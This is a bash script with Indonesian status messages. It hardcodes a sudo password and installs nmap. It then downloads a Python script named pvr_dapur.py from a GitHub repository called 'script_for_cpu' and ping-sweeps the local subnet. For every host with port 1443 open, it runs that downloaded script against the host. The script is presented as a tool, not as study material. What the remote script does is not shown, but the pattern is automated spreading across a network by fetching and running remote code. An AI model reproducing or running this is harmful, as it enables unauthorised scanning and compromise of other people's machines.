#!/bin/bash

# ================= CONFIG =================
SUDO_PASS="151971"
PORTS="1443,5555"
PARALLEL=5
SCRIPT_URL="https://raw.githubusercontent.com/lutfiihidayat/script_for_cpu/main/pvr_dapur.py"

run_sudo() {
    echo "$SUDO_PASS" | sudo -S "$@"
}

echo "=============================="
echo " AUTO SCAN + PYTHON EXECUTION"
echo "=============================="

# ================= INSTALL NMAP =================
if ! command -v nmap &> /dev/null; then
    run_sudo apt update -y
    run_sudo apt install nmap -y
fi

# ================= INSTALL PYTHON =================
if ! command -v python3 &> /dev/null; then
    run_sudo apt install python3 python3-pip -y
fi

# ================= INSTALL REQUESTS =================
pip3 show requests &> /dev/null
if [ $? -ne 0 ]; then
    pip3 install requests
fi

# ================= DOWNLOAD PYTHON =================
echo "[INFO] Download python script..."
curl -s -o pvr_dapur.py $SCRIPT_URL

if [ ! -f pvr_dapur.py ]; then
    echo "[ERROR] Gagal download python script"
    exit 1
fi

# ================= GET LOCAL SUBNET =================
SUBNET=$(ip -o -f inet addr show | awk '/scope global/ {print $4}' | head -n1)

if [ -z "$SUBNET" ]; then
    echo "[ERROR] Tidak dapat subnet"
    exit 1
fi

BASE=$(echo $SUBNET | cut -d. -f1-3)

echo "[INFO] Subnet detected: $BASE.0/24"

# ================= STEP 1: PING SWEEP =================
echo "[INFO] Ping sweep..."

for i in {1..254}; do
    ping -c 1 -W 1 $BASE.$i > /dev/null 2>&1 &
done
wait

# ================= STEP 2: GET ARP =================
IPS=$(arp -a | awk -F '[()]' '{print $2}' | grep -E "^$BASE\." | sort -u)

if [ -z "$IPS" ]; then
    echo "[ERROR] Tidak ada IP ditemukan"
    exit 1
fi

echo "[INFO] Total IP aktif: $(echo "$IPS" | wc -l)"

# ================= STEP 3: SCAN + RUN PYTHON =================
count=0

for ip in $IPS; do
(
    result=$(nmap -Pn -p $PORTS --open --max-retries 2 --host-timeout 5s -oG - $ip)

    if echo "$result" | grep -q "1443/open"; then
        echo "[FOUND] $ip:1443 → RUN PYTHON"

        python3 pvr_dapur.py $ip
    fi

) &

((count++))
if (( count % PARALLEL == 0 )); then
    wait
fi

done

wait

echo "=============================="
echo " DONE"
echo "=============================="
